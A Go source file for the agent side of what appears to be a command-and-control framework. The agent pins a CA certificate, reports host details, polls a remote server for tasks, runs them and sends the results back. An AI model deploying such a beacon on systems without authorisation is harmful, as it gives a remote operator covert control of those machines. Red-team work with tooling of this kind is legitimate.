// The agent which executes commands and sends results back to the server
package agent

import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"log"
	"net/http"
	"os"
	"runtime"
	"time"

	"github.com/MeHungr/peanut-butter/internal/api"
	"github.com/MeHungr/peanut-butter/internal/pberrors"
	agenttransport "github.com/MeHungr/peanut-butter/internal/transport/agent"
)

// CACertPEM is the certificate from the CA used by the server
var CACertPEM = []byte(`
-----BEGIN CERTIFICATE-----
MIIFAzCCAuugAwIBAgIUH21lI9YoDATUFEat5nc36m8AyRswDQYJKoZIhvcNAQEL
BQAwETEPMA0GA1UEAwwGUE5VVEJSMB4XDTI1MTEwMTAyMDYwMFoXDTM1MTAzMDAy
MDYwMFowETEPMA0GA1UEAwwGUE5VVEJSMIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
MIICCgKCAgEAswOy/IiS9qb4RBSHaBNbROOkLRO5889stMcd2JEzdYFhfFLnomYK
8e3ZaJolVzozX+aegwLrugIUtMEzoHK5oLSZ7UTbzK22UIOL59acRHoDNKsjmfvT
RnpJ/HDCFW0znv9pg4bZDYm1qk6FE6b7PSUuEo6eHKss4ULG9Y95ZHTzhguznmmS
b6Jjvso1ytbAGFAo7bPUYXjbNEnE27hK9ggxFE/QkkJAsgPfE376QIBp3Nqp2KGV
uMS+V+NvHD5PK30iycJzkEbtYRJagplYZCsm98yRjFAt6BkylOizbkE/gIiO5Wzn
BnkNiw/I9Z9LZpLI3de0fDNCuApjE5OeaG0/GlF4OjgxwXA/i0KMgIORzPr4P/+C
0LIW92WS72FAUHcz9HbmzGbw2huqBqPEeqiHUAqWszhx3/ob0m1OemuJFlN3EzN7
gyhosGHWLJ5uCeCrW+U+cB/nhTdrAhpbGCB5V2u09UqOUDEeEG0wWAWvdqWbrYPt
8nKMqVfxYO/0bnkawb7oE+BsEogV4GcsucH3hz8unmt2ZNG4rQr/dLVZlWvySGPM
9dSCe1wKyYjTrR7KWd1p7FTrkcibuuVOVPZKkNriOb0XIc/U1wUtICK+3hIbPmfg
5Hsx/ZMsiRYhZQivkjs+t2NIW2EWHaxT07bG9ch4qbJbOifk3KXJiXUCAwEAAaNT
MFEwHQYDVR0OBBYEFH7pgW1Q4MFMyI1NSVt4ijnaU+Y0MB8GA1UdIwQYMBaAFH7p
gW1Q4MFMyI1NSVt4ijnaU+Y0MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
BQADggIBAEfkg3PSBxrVFuCFKt2R6aCpvFusAcOcMd6Xq2qNGzPkDQU+chiVfnpp
E+F3kkNR03/I6V+EhfoB13PwovXEJesvKru6X46GqgF1vQo6gvZiqw4z74PC3yn+
ZRjOM2qQS/c4v+ngEmf+d/PSuDeXKKnlKUj/f1VOuQHJIsh/hVQUp9Z66Ztsl+kY
HaOw+A923fxEznpEhB53MEms8ZE5Yj6ESkN7rUO8LqHWYhKtF6s2ymAjqV1FV+Lm
PuR7puyR3S+MMSjaQciRJ+EHi6ROkpBS2GrTGpqKkujSexC6QWY2qxSYH4/zUdk3
h2AtBpwucGYlaNokv2QFtXVn0H4NzOwkhRwX9gD02xaeL3MFbdpO6jkK0Axo+pYF
e2mzFjRJVq0qdU+pwfjQhkly7WMU0UeXEj7pytVuPw8d1bEEG1fq8lsMh+f6p7hP
xjcvSvU0UG1FD3Y4XKcp6ptTLu/dWQh2Gtw2vLH8/UNJRLErKsEhXRG1qUrLwZp0
zX1rmIc2rcOtmPXVImQSvPoAg3M/bBACpRXQV6JqNPOenMwBolzsbUpcubtkhZfA
Zjf0kXvVfzp440lxNYO4zSntczCZbbKL8Af8GR2AeLxeEGJhw/CITl3D/scBELb5
xu0W2+F0iwiaFINjzYl8yrRrw7rCG/WXNVV4EtWOwC/dWRjU0WbS
-----END CERTIFICATE-----
`)

// Agent represents the agent
type Agent struct {
	Info  *api.Agent
	Debug bool
	comm  *agenttransport.CommManager
}

// NewHTTPSClient creates a new client for secure HTTPS communication
func NewHTTPSClient() *http.Client {
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(CACertPEM)

	tlsConfig := &tls.Config{
		RootCAs:    pool,
		MinVersion: tls.VersionTLS12,
	}

	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
		Timeout: 10 * time.Second,
	}
}

// New creates a new Agent with sensible defaults.
func New(id, serverIP string, serverPort int, callbackInterval time.Duration, debug bool) *Agent {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Initialize transports
	httpsTransport := &agenttransport.HTTPSTransport{Client: NewHTTPSClient()}

	return &Agent{
		Info: &api.Agent{
			AgentID:          id,
			AgentIP:          GetLocalIP(),
			ServerIP:         serverIP,
			ServerPort:       serverPort,
			CallbackInterval: callbackInterval,
			Hostname:         hostname,
			OS:               runtime.GOOS,
			Arch:             runtime.GOARCH,
		},
		Debug: debug,
		comm: &agenttransport.CommManager{
			Transports: map[string]agenttransport.Transport{
				"https": httpsTransport,
			},
			Active: httpsTransport,
		},
	}
}

// Start starts the agent and begins the main polling loop
func (a *Agent) Start() {
	if a.Debug {
		log.Printf("Agent starting with ID: %s\n", a.Info.AgentID)
	}

	// Attempt to register with the server until successful
	a.registerUntilDone()

	// Main polling loop
	for {
		task, err := a.comm.GetTask(a.Info, a.Debug)
		if err != nil {
			if errors.Is(err, pberrors.ErrInvalidAgentID) {
				a.registerUntilDone()
				continue
			}
			if a.Debug {
				log.Println("GetTask error:", err)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if task != nil {
			result, err := a.ExecuteTask(task)
			if err != nil {
				if a.Debug {
					log.Println("ExecuteTask error:", err)
				}
				continue
			}
			if err := a.comm.SendResult(a.Info, result, a.Debug); err != nil {
				if a.Debug {
					log.Println("SendResult error:", err)
				}
			}
		}

		time.Sleep(a.Info.CallbackInterval)
	}
}
